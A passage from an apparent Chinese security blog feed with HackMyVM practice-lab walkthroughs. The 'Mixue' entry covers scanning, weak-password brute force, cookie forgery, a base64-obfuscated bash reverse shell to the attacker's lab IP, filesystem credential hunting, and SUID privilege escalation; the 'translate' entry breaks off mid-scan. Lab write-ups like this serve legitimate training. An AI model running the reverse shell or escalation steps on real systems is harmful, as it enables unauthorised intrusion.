class="hljs-char escape_">\/</span>products<span class="hljs-char escape_">\/</span>generic-cms<span class="hljs-char escape_">\/</span>&quot;</span><span class="hljs-operator">&gt;</span>Generic CMS<span class="hljs-operator">&lt;</span>\<span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span><span class="hljs-symbol">/</span> &#125;,<br><br><span class="hljs-comment"># This extracts the version of Generic CMS from the Mega generator tag.</span><br>&#123; <span class="hljs-meta">:name</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-string">&quot;Meta generator&quot;</span>,  <span class="hljs-meta">:version</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-operator">/</span><span class="hljs-operator">&lt;</span>meta name<span class="hljs-operator">=</span><span class="hljs-string">&quot;generator&quot;</span> content<span class="hljs-operator">=</span><span class="hljs-string">&quot;Generic CMS version ([a-z0-9])+/ &#125;,</span><br><span class="hljs-string">] </span><br><span class="hljs-string"></span><br><span class="hljs-string">end</span><br></code></pre></td></tr></table></figure><p>在中间加入上面的chmod+x &#x2F;bin&#x2F;bash即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Mixue</title>
    <link href="/2025/06/02/HackMyVM-Mixue/"/>
    <url>/2025/06/02/HackMyVM-Mixue/</url>
    
    <content type="html"><![CDATA[<p>依旧是群友靶机，拿到了userflag。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr><p>靶机IP：192.168.56.111</p><p>nmap扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -v 192.168.56.111<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-02 10:57 EDT<br>NSE: Loaded 156 scripts <span class="hljs-keyword">for</span> scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 10:57<br>Completed NSE at 10:57, 0.00s elapsed<br>Initiating NSE at 10:57<br>Completed NSE at 10:57, 0.00s elapsed<br>Initiating NSE at 10:57<br>Completed NSE at 10:57, 0.00s elapsed<br>Initiating ARP Ping Scan at 10:57<br>Scanning 192.168.56.111 [1 port]<br>Completed ARP Ping Scan at 10:57, 0.05s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 10:57<br>Completed Parallel DNS resolution of 1 host. at 10:57, 0.02s elapsed<br>Initiating SYN Stealth Scan at 10:57<br>Scanning 192.168.56.111 [1000 ports]<br>Discovered open port 22/tcp on 192.168.56.111<br>Discovered open port 80/tcp on 192.168.56.111<br>Completed SYN Stealth Scan at 10:57, 0.07s elapsed (1000 total ports)<br>Initiating Service scan at 10:57<br>Scanning 2 services on 192.168.56.111<br>Completed Service scan at 10:58, 6.03s elapsed (2 services on 1 host)<br>Initiating OS detection (try <span class="hljs-comment">#1) against 192.168.56.111</span><br>NSE: Script scanning 192.168.56.111.<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.23s elapsed<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.01s elapsed<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.00s elapsed<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.00050s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: MIXUE Ice Cream &amp; Tea - Official Site<br>|_http-server-header: Apache/2.4.62 (Debian)<br>| http-methods: <br>|_  Supported Methods: HEAD GET POST OPTIONS<br>MAC Address: 08:00:27:B7:D0:C7 (Oracle VirtualBox virtual NIC)<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 25.680 days (since Wed May  7 18:38:39 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=257 (Good luck!)<br>IP ID Sequence Generation: All zeros<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.50 ms 192.168.56.111<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.00s elapsed<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.00s elapsed<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.10 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)<br></code></pre></td></tr></table></figure><p>dirsearch：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"> _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/Desktop/reports/_192.168.56.111/_25-06-02_10-59-08.txt<br><br>Target: http://192.168.56.111/<br><br>[10:59:08] Starting:                                                                                                                                       <br>[10:59:09] 403 -  279B  - /.ht_wsr.txt                                      <br>[10:59:09] 403 -  279B  - /.htaccess.orig                                   <br>[10:59:09] 403 -  279B  - /.htaccess.sample<br>[10:59:09] 403 -  279B  - /.htaccess.save<br>[10:59:09] 403 -  279B  - /.htaccess_extra                                  <br>[10:59:09] 403 -  279B  - /.htaccess_orig                                   <br>[10:59:09] 403 -  279B  - /.htaccess_sc<br>[10:59:09] 403 -  279B  - /.htaccessBAK<br>[10:59:09] 403 -  279B  - /.htaccessOLD<br>[10:59:09] 403 -  279B  - /.htaccessOLD2<br>[10:59:09] 403 -  279B  - /.html                                            <br>[10:59:09] 403 -  279B  - /.htm<br>[10:59:09] 403 -  279B  - /.htpasswd_test                                   <br>[10:59:09] 403 -  279B  - /.httr-oauth                                      <br>[10:59:09] 403 -  279B  - /.htpasswds<br>[10:59:10] 403 -  279B  - /.htaccess.bak1                                   <br>[10:59:10] 403 -  279B  - /.php                                             <br>[10:59:18] 302 -    0B  - /dashboard.php  -&gt;  login.php                     <br>[10:59:23] 200 -  832B  - /login.php                                        <br>[10:59:30] 403 -  279B  - /server-status                                    <br>[10:59:30] 403 -  279B  - /server-status/                                   <br>[10:59:35] 301 -  318B  - /uploads  -&gt;  http://192.168.56.111/uploads/      <br>[10:59:35] 200 -  407B  - /uploads/ <br></code></pre></td></tr></table></figure><p>gobuster：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u 192.168.56.111 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip <br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.111<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,zip,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 279]<br>/index.html           (Status: 200) [Size: 20196]<br>/.html                (Status: 403) [Size: 279]<br>/login.php            (Status: 200) [Size: 2189]<br>/uploads              (Status: 301) [Size: 318] [--&gt; http://192.168.56.111/uploads/]<br>/dashboard.php        (Status: 302) [Size: 0] [--&gt; login.php]<br>/.php                 (Status: 403) [Size: 279]<br>/.html                (Status: 403) [Size: 279]<br>/server-status        (Status: 403) [Size: 279]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>开放了22和80端口，经典的index，login，dashboard三件套，还有个uploads，一开始我以为是可以自己传恶意文件上去的，后来发现想多了。</p><p>访问index.html，是个静态页面，什么东西都不能点，底下的发送email订阅也只是个架子，没法真的发东西。</p><p><img src="/2025/06/02/HackMyVM-Mixue/msedge_7H4HhqpYqr.png"></p><p>再访问&#x2F;uploads&#x2F;，同样的空界面，没有上传按钮，源码没东西。</p><p><img src="/2025/06/02/HackMyVM-Mixue/msedge_1oQe7pg8Ml.png"></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p>只能访问login了，是个经典的登录界面，用admin试试常见的字典，没有成功。</p><p><img src="/2025/06/02/HackMyVM-Mixue/msedge_JR99D6bdwi.png"></p><p>这时候我们回看index的最底下，有个sublarge的邮箱，通常情况下，这就是网站管理员的账户邮箱，我们换上sublarge的用户名再爆破一次，得到使用了弱口令123456，成功登录。</p><p>（其实这里不光有admin和sublarge账户，还有一些弱口令比如test，guest账户，不过权限都是wwwdata，没有区别）</p><p><img src="/2025/06/02/HackMyVM-Mixue/msedge_jADNL7YC98.png"></p><p>又提示我们没有管理员权限，抓包查看，发现管理员权限是通过cookie管理的。</p><p><img src="/2025/06/02/HackMyVM-Mixue/cloudmusic_IhiBFmk2dF.png"></p><p>修改cookie，得到一个命令执行界面，反弹shell到我们的主机上。</p><p><img src="/2025/06/02/HackMyVM-Mixue/cloudmusic_ltgAq89VSv.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvNDQ0NCAwPiYxKSAm|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_S84Qap74no.png"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><hr><p>拿到webshell之后先看看本地目录下有没有什么能用的东西，可惜没有。</p><p>这里的admin密码比较复杂，没法通过一般的字典爆出来，搞得我以为是ssh的密码浪费挺多时间的。</p><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_KHM0f4USVO.png"></p><p>再看一下&#x2F;home下面的用户，这里已经初见端倪了，有个用户组是属于root的。</p><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_zcOCN7ZY6t.png"></p><p>看一下他名下的文件，第一个文件拿到sublarge的ssh登录密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user suraxddq 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_68zlsw62PB.png"></p><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_AtOdFU3jAW.png"></p><p>事实上如果没有发现，也可以使用grep暴力获取。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;sublarge&quot;</span> -r -n / 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_06SrqTk8u7.png"></p><p>ssh登录到sublarge上获取userflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh sublarge@192.168.56.111<br>sublarge@192.168.56.111<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Mixue 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">sublarge@Mixue:~$ ls</span><br><span class="hljs-string">user.txt</span><br><span class="hljs-string">sublarge@Mixue:~$ cat user.txt </span><br><span class="hljs-string">flag&#123;user-88c71208-3bbd-11f0-b2d7-000c2955ba04&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>回看之前suraxddq的文件，里面有一个key，还有一个logs。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Mixue:/home/suraxddq$ <span class="hljs-built_in">cat</span> key<br>fix me<br>www-data@Mixue:/home/suraxddq$ <span class="hljs-built_in">cat</span> logs<br>root@Mixue:~# <span class="hljs-built_in">cat</span> /etc/systemd/system/key-monitor.service<br>[Unit]<br>Description=Key file monitor<br><br>[Service]<br>ExecStart=/usr/local/bin/monitor_key.sh<br>Restart=always<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>可以看出这个logs指向一个叫monitor_key的sh文件。</p><p>(事实上上传pspy等进程监视工具也可以直接看到)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Mixue:/home/suraxddq$ <span class="hljs-built_in">cat</span> /usr/local/bin/monitor_key.sh<br><span class="hljs-comment">#!/bin/bash</span><br>inotifywait -m -e modify,attrib,close_write,move,delete /home/suraxddq/key |<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span>; <span class="hljs-keyword">do</span><br>    /opt/change.sh<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>当key文件被修改时，自动执行change.sh文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Mixue:/home/suraxddq$ <span class="hljs-built_in">cat</span> /opt/change.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br><br><span class="hljs-built_in">chown</span> root:root /tmp/tmpfile 2&gt;/dev/null<br><span class="hljs-built_in">chmod</span> 4755 /tmp/tmpfile 2&gt;/dev/null<br><span class="hljs-built_in">sleep</span> 10<br><span class="hljs-built_in">rm</span> /tmp/tmpfile 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>用root权限执行&#x2F;tmp&#x2F;tmpfile文件。</p><p>利用链很清晰了，现在唯一的难点在于如何拿到修改key，也就是suraxddq的权限。</p><p>很简单，两个用户密码相同。（唉）</p><p>（事实上，所有用户包括root都是这个密码）（唉唉）</p><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_yJ01QP8MRl.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tmpfile-5.0# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-8b360934-3bae-11f0-b977-000c2955ba04&#125;<br></code></pre></td></tr></table></figure><p>这个靶场的难度真的是非常简单了，千万注意信息收集和密码复用。</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-translate</title>
    <link href="/2025/05/29/HackMyVM-translate/"/>
    <url>/2025/05/29/HackMyVM-translate/</url>
    
    <content type="html"><![CDATA[<p>昨天群里发的靶机，很遗憾没能做成功，现在来复盘一下。</p><p>靶机ip:192.168.56.108</p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><hr><p>nmap:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -v 192.168.56.108<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-28 23:25 EDT<br>NSE: Loaded 156 scripts <span class="hljs-keyword">for</span> scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 23:25<br>Completed NSE at 23:25, 0.00s elapsed<br>Initiating NSE at 23:25<br>Completed NSE at 23:25, 0.00s elapsed<br>Initiating NSE at 23:25<br>Completed NSE at 23:25, 0.00s elapsed<br>Initiating ARP Ping Scan at 23:25<br>Scanning 192.168.56.108 [1 port]<br>Completed ARP Ping Scan at 23:25, 0.05s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 23:25<br>Completed Parallel DNS resolution of 1 host. at 23:25, 0.02s elapsed<br>Initiating SYN Stealth Scan at 23:25<br>Scanning 192.168.56.108 [1000 ports]<br>Discovered open port 80/tcp on 192.168.56.108<br>Discovered open port 22/tcp on 192.168.56.108<br>Discovered open port 5001/tcp on 192.168.56.108<br>Completed SYN Stealth Scan at 23:25, 0.06s elapsed (1000 total ports)<br>Initiating Service scan at 23:25<br>Scanning 3 services on 192.168.56.108<br>Completed Service scan at 23:26, 91.31s elapsed (3 services on 1 host)<br>Initiating OS detection (try <span class="hljs-comment">#1) against 192.168.56.108</span><br>NSE: Script scanning 192.168.56.108.<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.83s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 1.02s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.0012s latency).<br>Not shown: 997 closed tcp ports (reset)<br>PORT     STATE SERVICE        VERSION<br>22/tcp   open  ssh            OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http           Apache httpd 2.4.62 ((Debian))<br>| http-methods: <br>|_  Supported Methods: OPTIONS HEAD GET POST<br>|_http-title: \xE6\x88\x91\xE7\x9A\x84\xE9\xA1\xB5\xE9\x9D\xA2<br>|_http-server-header: Apache/2.4.62 (Debian)<br>5001/tcp open  commplex-link?<br>| fingerprint-strings: <br>|   GetRequest: <br>|     HTTP/1.1 405 METHOD NOT ALLOWED<br>|     Server: Werkzeug/3.1.3 Python/3.9.2<br>|     Date: Thu, 29 May 2025 03:25:35 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Allow: POST, OPTIONS<br>|     Content-Length: 153<br>|     Access-Control-Allow-Origin: *<br>|     Connection: close<br>|     &lt;!doctype html&gt;<br>|     &lt;html lang=en&gt;<br>|     &lt;title&gt;405 Method Not Allowed&lt;/title&gt;<br>|     &lt;h1&gt;Method Not Allowed&lt;/h1&gt;<br>|     &lt;p&gt;The method is not allowed <span class="hljs-keyword">for</span> the requested URL.&lt;/p&gt;<br>|   HTTPOptions: <br>|     HTTP/1.1 200 OK<br>|     Server: Werkzeug/3.1.3 Python/3.9.2<br>|     Date: Thu, 29 May 2025 03:25:35 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Allow: POST, OPTIONS<br>|     Access-Control-Allow-Origin: *<br>|     Content-Length: 0<br>|     Connection: close<br>|   Help: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request syntax (<span class="hljs-string">&#x27;HELP&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   RTSPRequest: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request version (<span class="hljs-string">&#x27;RTSP/1.0&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port5001-TCP:V=7.94SVN%I=7%D=5/28%Time=6837D3B0%P=x86_64-pc-linux-gnu%r<br>SF:(GetRequest,18C,<span 